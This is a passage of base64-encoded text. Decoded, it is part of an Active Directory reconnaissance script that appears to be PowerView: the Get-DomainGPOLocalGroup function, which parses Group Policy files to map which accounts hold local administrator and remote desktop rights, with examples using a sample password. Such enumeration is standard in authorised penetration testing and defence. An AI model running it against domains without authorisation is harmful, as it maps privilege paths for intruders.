2hpcCcKc2VjdGlvbiBkYXRhIGlzIHByb2Nlc3NlZCBpZiBwcmVzZW50LiBBbnkgZm91bmQgR3JvdXBzLnhtbCBmaWxlcyBhcmUgcGFyc2VkIHdpdGgKR2V0LUdyb3Vwc1hNTCBhbmQgdGhvc2UgbWVtYmVyc2hpcHMgYXJlIHJldHVybmVkIGFzIHdlbGwuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIGRpc3BsYXkgbmFtZSAoZS5nLiAnVGVzdCBHUE8nKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gJ0NOPXtGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzJ9LENOPVBvbGljaWVzLENOPVN5c3RlbSxEQz10ZXN0bGFiLERDPWxvY2FsJyksCkdVSUQgKGUuZy4gJzEwZWMzMjBkLTMxMTEtNGVmNC04ZmFmLThmMTRmNGFkYzc4OScpLCBvciBHUE8gbmFtZSAoZS5nLiAne0YyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3Mn0nKS4gV2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBSZXNvbHZlTWVtYmVyc1RvU0lEcwoKU3dpdGNoLiBJbmRpY2F0ZXMgdGhhdCBhbnkgbWVtYmVyIG5hbWVzIHNob3VsZCBiZSByZXNvbHZlZCB0byB0aGVpciBkb21haW4gU0lEcy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5HUE9Mb2NhbEdyb3VwCgpSZXR1cm5zIGFsbCBsb2NhbCBncm91cHMgc2V0IGJ5IEdQTyBhbG9uZyB3aXRoIHRoZWlyIG1lbWJlcnMgYW5kIG1lbWJlcm9mLgoKLkVYQU1QTEUKCkdldC1Eb21haW5HUE9Mb2NhbEdyb3VwIC1SZXNvbHZlTWVtYmVyc1RvU0lEcwoKUmV0dXJucyBhbGwgbG9jYWwgZ3JvdXBzIHNldCBieSBHUE8gYWxvbmcgd2l0aCB0aGVpciBtZW1iZXJzIGFuZCBtZW1iZXJvZiwKYW5kIHJlc29sdmUgYW55IG1lbWJlcnMgdG8gdGhlaXIgZG9tYWluIFNJRHMuCgouRVhBTVBMRQoKJ3swODQ3QzYxNS02QzRFLTRENDUtQTA2NC02MDAxMDQwQ0MyMUN9JyB8IEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwCgpSZXR1cm4gYW55IEdQTy1zZXQgZ3JvdXBzIGZvciB0aGUgR1BPIHdpdGggdGhlIGdpdmVuIG5hbWUvR1VJRC4KCi5FWEFNUExFCgpHZXQtRG9tYWluR1BPTG9jYWxHcm91cCAnRGVza3RvcHMnCgpSZXR1cm4gYW55IEdQTy1zZXQgZ3JvdXBzIGZvciB0aGUgR1BPIHdpdGggdGhlIGdpdmVuIGRpc3BsYXkgbmFtZS4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluR1BPTG9jYWxHcm91cCAtQ3JlZGVudGlhbCAkQ3JlZAoKLkxJTksKCmh0dHBzOi8vbW9yZ2Fuc2ltb25zZW5ibG9nLmF6dXJld2Vic2l0ZXMubmV0L3RhZy9ncm91cHMvCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR1BPR3JvdXAnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlTWVtYmVyc1RvU0lEcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRDb252ZXJ0QXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb252ZXJ0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRTcGxpdE9wdGlvbiA9IFtTeXN0ZW0uU3RyaW5nU3BsaXRPcHRpb25zXTo6UmVtb3ZlRW1wdHlFbnRyaWVzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQoKICAgICAgICBHZXQtRG9tYWluR1BPIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT2Rpc3BsYXlOYW1lID0gJF8uZGlzcGxheW5hbWUKICAgICAgICAgICAgJEdQT25hbWUgPSAkXy5uYW1lCiAgICAgICAgICAgICRHUE9QYXRoID0gJF8uZ3BjZmlsZXN5c3BhdGgKCiAgICAgICAgICAgICRQYXJzZUFyZ3MgPSAgQHsgJ0dwdFRtcGxQYXRoJyA9ICIkR1BPUGF0aFxNQUNISU5FXE1pY3Jvc29mdFxXaW5kb3dzIE5UXFNlY0VkaXRcR3B0VG1wbC5pbmYiIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRQYXJzZUFyZ3NbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgICAgICMgZmlyc3QgcGFyc2UgdGhlICdSZXN0cmljdGVkIEdyb3VwcycgZmlsZSAoR3B0VG1wbC5pbmYpIGlmIGl0IGV4aXN0cwogICAgICAgICAgICAkSW5mID0gR2V0LUdwdFRtcGwgQFBhcnNlQXJncwoKICAgICAgICAgICAgaWYgKCRJbmYgLWFuZCAoJEluZi5wc2Jhc2UuS2V5cyAtY29udGFpbnMgJ0dyb3VwIE1lbWJlcnNoaXAnKSkgewogICAgICAgICAgICAgICAgJE1lbWJlcnNoaXBzID0gQHt9CgogICAgICAgICAgICAgICAgIyBwYXJzZSB0aGUgbWVtYmVycy9tZW1iZXJvZiBmaWVsZHMgZm9yIGVhY2ggZW50cnkKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXJzaGlwIGluICRJbmYuJ0dyb3VwIE1lbWJlcnNoaXAnLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgICRHcm91cCwgJFJlbGF0aW9uID0gJE1lbWJlcnNoaXAuS2V5LlNwbGl0KCdfXycsICRTcGxpdE9wdGlvbikgfCBGb3JFYWNoLU9iamVjdCB7JF8uVHJpbSgpfQogICAgICAgICAgICAgICAgICAgICMgZXh0cmFjdCBvdXQgQUxMIG1lbWJlcnMKICAgICAgICAgICAgICAgICAgICAkTWVtYmVyc2hpcFZhbHVlID0gJE1lbWJlcnNoaXAuVmFsdWUgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsgJF8uVHJpbSgnKicpIH0gfCBXaGVyZS1PYmplY3QgeyRffQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlTWVtYmVyc1RvU0lEcyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgdGhlIHJlc3VsdGluZyBtZW1iZXIgaXMgdXNlcm5hbWUgYW5kIG5vdCBhIFNJRCwgYXR0ZW1wdCB0byByZXNvbHZlIGl0CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgPSBAKCkKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVyc2hpcFZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlciAtYW5kICgkTWVtYmVyLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW5vdG1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydFRvQXJndW1lbnRzID0gQHsnT2JqZWN0TmFtZScgPSAkTWVtYmVyfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udmVydFRvQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyU0lEID0gQ29udmVydFRvLVNJRCBAQ29udmVydFRvQXJndW1lbnRzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNJRCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyArPSAkTWVtYmVyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyArPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwVmFsdWUgPSAkR3JvdXBNZW1iZXJzCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWVtYmVyc2hpcHNbJEdyb3VwXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyc2hpcHNbJEdyb3VwXSA9IEB7fQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnNoaXBWYWx1ZSAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHskTWVtYmVyc2hpcFZhbHVlID0gQCgkTWVtYmVyc2hpcFZhbHVlKX0KICAgICAgICAgICAgICAgICAgICAkTWVtYmVyc2hpcHNbJEdyb3VwXS5BZGQoJFJlbGF0aW9uLCAkTWVtYmVyc2hpcFZhbHVlKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXJzaGlwIGluICRNZW1iZXJzaGlwcy5HZXRFbnVtZXJhdG9yKCkpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlcnNoaXAgLWFuZCAkTWVtYmVyc2hpcC5LZXkgLWFuZCAoJE1lbWJlcnNoaXAuS2V5IC1tYXRjaCAnXlwqJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGUgU0lEIGlzIGFscmVhZHkgcmVzb2x2ZWQgKGkuZS4gYmVnaW5zIHdpdGggKikgdHJ5IHRvIHJlc29sdmUgU0lEIHRvIGEgbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAkTWVtYmVyc2hpcC5LZXkuVHJpbSgnKicpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBTSUQgLWFuZCAoJEdyb3VwU0lELlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTSUQgJEdyb3VwU0lEIEBDb252ZXJ0QXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE5hbWUgPSAkTWVtYmVyc2hpcC5LZXkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBOYW1lIC1hbmQgKCRHcm91cE5hbWUuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBuYW1lIC1tYXRjaCAnQWRtaW5pc3RyYXRvcnMnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU0NCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ1JlbW90ZSBEZXNrdG9wJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9ICdTLTEtNS0zMi01NTUnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cG5hbWUgLW1hdGNoICdHdWVzdHMnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU0NicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJEdyb3VwTmFtZS5UcmltKCkgLW5lICcnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRUb0FyZ3VtZW50cyA9IEB7J09iamVjdE5hbWUnID0gJEdyb3VwbmFtZX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udmVydFRvQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9IENvbnZlcnRUby1TSUQgQENvbnZlcnRUb0FyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9EaXNwbGF5TmFtZScgJEdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT05hbWUnICRHUE9OYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1BhdGgnICRHUE9QYXRoCiAgICAgICAgICAgICAgICAgICAgJEdQT0dyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1R5cGUnICdSZXN0cmljdGVkR3JvdXBzJwogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdGaWx0ZXJzJyAkTnVsbAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBTSUQnICRHcm91cFNJRAogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlck9mJyAkTWVtYmVyc2hpcC5WYWx1ZS5NZW1iZXJvZgogICAgICAgICAgICAgICAgICAgICRHUE9Hcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlcnMnICRNZW1iZXJzaGlwLlZhbHVlLk1lbWJlcnMKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkdQT0dyb3VwJykKICAgICAgICAgICAgICAgICAgICAkR1BPR3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBub3cgdHJ5IHRvIHRoZSBwYXJzZSBncm91cCBwb2xpY3kgcHJlZmVyZW5jZXMgZmlsZSAoR3JvdXBzLnhtbCkgaWYgaXQgZXhpc3RzCiAgICAgICAgICAgICRQYXJzZUFyZ3MgPSAgQHsKICAgICAgICAgICAgICAgICdHcm91cHNYTUxwYXRoJyA9ICIkR1BPUGF0aFxNQUNISU5FXFByZWZlcmVuY2VzXEdyb3Vwc1xHcm91cHMueG1sIgogICAgICAgICAgICB9CgogICAgICAgICAgICBHZXQtR3JvdXBzWE1MIEBQYXJzZUFyZ3MgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlTWVtYmVyc1RvU0lEcyddKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyA9IEAoKQogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJF8uR3JvdXBNZW1iZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1hbmQgKCRNZW1iZXIuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1ub3RtYXRjaCAnXlMtMS0uKicpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGUgcmVzdWx0aW5nIG1lbWJlciBpcyB1c2VybmFtZSBhbmQgbm90IGEgU0lELCBhdHRlbXB0IHRvIHJlc29sdmUgaXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydFRvQXJndW1lbnRzID0gQHsnT2JqZWN0TmFtZScgPSAkR3JvdXBuYW1lfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb252ZXJ0VG9Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9IENvbnZlcnRUby1TSUQgLURvbWFpbiAkRG9tYWluIC1PYmplY3ROYW1lICRNZW1iZXIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJTSUQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyArPSAkTWVtYmVyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkXy5Hcm91cE1lbWJlcnMgPSAkR3JvdXBNZW1iZXJzCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPRGlzcGxheU5hbWUnICRHUE9EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPTmFtZScgJEdQT05hbWUKICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1R5cGUnICdHcm91cFBvbGljeVByZWZlcmVuY2VzJwogICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkdQT0dyb3VwJykKICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluR1BPVXNlckxvY2FsR3JvdXBNYXBwaW5nIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBtYWNoaW5lcyB3aGVyZSBhIHNwZWNpZmljIGRvbWFpb